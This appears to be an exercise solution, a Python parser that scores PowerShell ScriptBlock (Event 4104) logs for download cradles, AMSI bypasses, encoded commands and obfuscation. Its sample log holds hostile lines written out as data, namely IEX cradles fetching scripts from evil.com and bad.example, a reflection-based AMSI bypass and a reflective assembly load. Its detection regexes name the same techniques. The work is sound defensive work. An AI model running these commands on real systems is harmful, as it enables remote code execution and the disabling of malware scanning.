"""
Q11. Windows PowerShell ScriptBlock Log Parser
================================================
Parse Event ID 4104 (ScriptBlock logging) to detect download cradles,
AMSI bypasses, encoded commands, and obfuscation.

=============================================================================
SOLUTION PROGRESSION
=============================================================================

NAIVE: Grep for "IEX" and flag.
  Problem: Attackers encode the string. grep("IEX") misses
  `[char]73+[char]69+[char]88` or `-enc SW...`. Also, no scoring means
  high false-positive rate — legitimate scripts use IEX too.

BETTER: Check for -EncodedCommand; base64-decode and re-check.
  Problem: Misses the AMSI bypass patterns, the obfuscation scoring,
  and the "concat+invoke" patterns that reconstruct dangerous strings at runtime.

GOOGLE-LEVEL (this file):
  - Base64 decode + recursive analysis on encoded payloads.
  - Named pattern categories, each with a weight for composite risk scoring.
  - Obfuscation score: count tick-marks, char-array reconstructions,
    string reversal, split+join patterns.
  - Report shows both raw script and decoded payload (if applicable).

Complexity: O(N × L) where L = average script length.
=============================================================================
"""

import re
import sys
import base64
import math
from collections import defaultdict
from datetime import datetime

# ─────────────────────────────────────────────────────────────────────────────
# SAMPLE DATA  (simplified Event 4104 text format)
# ─────────────────────────────────────────────────────────────────────────────

SAMPLE_LOG = r"""
EventID=4104 TimeCreated=2024-03-12T08:00:00Z ComputerName=WKSTN01 UserName=alice ScriptBlock=Write-Host 'Hello World'
EventID=4104 TimeCreated=2024-03-12T08:01:00Z ComputerName=WKSTN01 UserName=alice ScriptBlock=IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
EventID=4104 TimeCreated=2024-03-12T08:02:00Z ComputerName=WKSTN01 UserName=alice ScriptBlock=powershell -enc SW1wb3J0LU1vZHVsZSBBY3RpdmVEaXJlY3Rvcnk=
EventID=4104 TimeCreated=2024-03-12T08:03:00Z ComputerName=WKSTN01 UserName=bob ScriptBlock=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
EventID=4104 TimeCreated=2024-03-12T08:04:00Z ComputerName=WKSTN02 UserName=carol ScriptBlock=$c='IEX';$u='http://bad.example/s.ps1';& ([scriptblock]::Create($c+" (New-Object Net.WebClient).DownloadString('$u')"))
EventID=4104 TimeCreated=2024-03-12T08:05:00Z ComputerName=WKSTN02 UserName=carol ScriptBlock=sal a New-Object;a IO.MemoryStream; $x = [convert]::FromBase64String('dGVzdA=='); [System.Reflection.Assembly]::Load($x)
EventID=4104 TimeCreated=2024-03-12T08:06:00Z ComputerName=WKSTN03 UserName=dave ScriptBlock=Get-Process
"""

# ─────────────────────────────────────────────────────────────────────────────
# DETECTION PATTERNS  (pattern, weight, description)
# ─────────────────────────────────────────────────────────────────────────────

PATTERNS = [
    # (name, compiled_regex, risk_weight)
    ("DOWNLOAD_CRADLE_IEX",
     re.compile(r'\bIEX\b|\bInvoke-Expression\b', re.IGNORECASE), 4),
    ("DOWNLOAD_CRADLE_WEBCLIENT",
     re.compile(r'New-Object\s+Net\.WebClient|DownloadString|DownloadFile', re.IGNORECASE), 3),
    ("AMSI_BYPASS",
     re.compile(r'AmsiUtils|amsiInitFailed|amsiContext|AmsiScanBuffer', re.IGNORECASE), 5),
    ("REFLECTION_LOAD",
     re.compile(r'\[System\.Reflection\.Assembly\]::Load|\[Reflection\.Assembly\]::Load', re.IGNORECASE), 4),
    ("ENCODED_COMMAND",
     re.compile(r'-(?:en(?:c(?:odedcommand)?)?)\s+[A-Za-z0-9+/=]{20,}', re.IGNORECASE), 3),
    ("SCRIPTBLOCK_CREATE",
     re.compile(r'\[scriptblock\]::create', re.IGNORECASE), 3),
    ("CONCAT_INVOKE",
     re.compile(r'\$[a-z]+\s*=\s*[\'"][A-Z]{2,5}[\'"].*?&\s*\(', re.IGNORECASE | re.DOTALL), 3),
    ("BASE64_DECODE",
     re.compile(r'\[convert\]::FromBase64String|FromBase64|System\.Convert::FromBase64', re.IGNORECASE), 2),
    ("OBFUSCATION_TICKS",
     re.compile(r'`[a-zA-Z]'), 1),
    ("CHAR_ARRAY_RECONSTRUCT",
     re.compile(r'\[char\]\d+', re.IGNORECASE), 2),
    ("STRING_REVERSE",
     re.compile(r'-join.*?\[::-1\]|\[array\]::reverse', re.IGNORECASE), 3),
]

# ─────────────────────────────────────────────────────────────────────────────
# PARSER
# ─────────────────────────────────────────────────────────────────────────────

LOG_RE = re.compile(
    r'EventID=(?P<eid>\d+)\s+'
    r'TimeCreated=(?P<ts>\S+)\s+'
    r'ComputerName=(?P<computer>\S+)\s+'
    r'UserName=(?P<user>\S+)\s+'
    r'ScriptBlock=(?P<script>.+)',
    re.DOTALL,
)

ENC_CMD_RE = re.compile(
    r'-(?:en(?:c(?:odedcommand)?)?)\s+(?P<payload>[A-Za-z0-9+/=]{20,})',
    re.IGNORECASE,
)


def safe_b64_decode(payload: str) -> str | None:
    """Decode base64; return None on failure. Handles UTF-16LE (PowerShell default)."""
    try:
        # PowerShell uses UTF-16LE for -EncodedCommand
        raw = base64.b64decode(payload + "==")  # pad to avoid padding errors
        return raw.decode("utf-16-le", errors="replace")
    except Exception:
        return None


def parse_line(line: str) -> dict | None:
    line = line.strip()
    if not line:
        return None
    m = LOG_RE.match(line)
    if not m:
        return None
    try:
        ts = datetime.strptime(m.group("ts"), "%Y-%m-%dT%H:%M:%SZ").timestamp()
    except ValueError:
        return None
    return {
        "event_id": int(m.group("eid")),
        "ts":       ts,
        "computer": m.group("computer"),
        "user":     m.group("user"),
        "script":   m.group("script").strip(),
    }


# ─────────────────────────────────────────────────────────────────────────────
# ANALYZER
# ─────────────────────────────────────────────────────────────────────────────

def analyze_script(script: str) -> tuple[list[dict], int, str | None]:
    """
    Analyze a script block.
    Returns (matched_patterns, total_risk_score, decoded_payload_or_None).
    """
    matches = []
    score   = 0

    for name, pattern, weight in PATTERNS:
        if pattern.search(script):
            count = len(pattern.findall(script))
            matches.append({"pattern": name, "weight": weight, "count": count})
            score += weight * min(count, 3)  # cap to avoid extreme scores from repetition

    # Try to decode base64 encoded command
    decoded = None
    enc_m   = ENC_CMD_RE.search(script)
    if enc_m:
        decoded = safe_b64_decode(enc_m.group("payload"))
        if decoded:
            # Recursively score the decoded payload
            sub_matches, sub_score, _ = analyze_script(decoded)
            if sub_matches:
                matches.append({
                    "pattern": "ENCODED_PAYLOAD_CONTAINS",
                    "weight":  sub_score,
                    "count":   len(sub_matches),
                    "sub":     [s["pattern"] for s in sub_matches],
                })
                score += sub_score

    return matches, score, decoded


def risk_label(score: int) -> str:
    if score >= 8:
        return "CRITICAL"
    if score >= 5:
        return "HIGH"
    if score >= 2:
        return "MEDIUM"
    return "LOW"


# ─────────────────────────────────────────────────────────────────────────────
# REPORT
# ─────────────────────────────────────────────────────────────────────────────

def print_report(records: list[dict]) -> None:
    print("=" * 65)
    print("POWERSHELL SCRIPTBLOCK LOG ANALYSIS REPORT")
    print("=" * 65)

    flagged = []
    for r in records:
        if r["event_id"] != 4104:
            continue
        matches, score, decoded = analyze_script(r["script"])
        if not matches:
            continue
        flagged.append((score, r, matches, decoded))

    flagged.sort(key=lambda x: x[0], reverse=True)

    for score, r, matches, decoded in flagged:
        ts = datetime.utcfromtimestamp(r["ts"]).strftime("%Y-%m-%dT%H:%M:%SZ")
        risk = risk_label(score)
        print(f"\n  [{risk}] score={score}  user={r['user']}  host={r['computer']}  ts={ts}")
        print(f"  Script: {r['script'][:120]}{'...' if len(r['script']) > 120 else ''}")
        for m in matches:
            print(f"    pattern={m['pattern']}  weight={m['weight']}  count={m['count']}")
        if decoded:
            print(f"  Decoded payload: {decoded[:120]}{'...' if len(decoded) > 120 else ''}")
    print(f"\nTotal flagged: {len(flagged)}")
    print("=" * 65)


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    if len(sys.argv) > 1:
        with open(sys.argv[1], encoding="utf-8", errors="replace") as fh:
            raw_lines = fh.readlines()
    else:
        print("[INFO] Using embedded sample data.\n")
        raw_lines = SAMPLE_LOG.splitlines(keepends=True)

    records = [r for r in (parse_line(l) for l in raw_lines) if r is not None]
    print(f"Parsed {len(records)} ScriptBlock log events.\n")
    print_report(records)
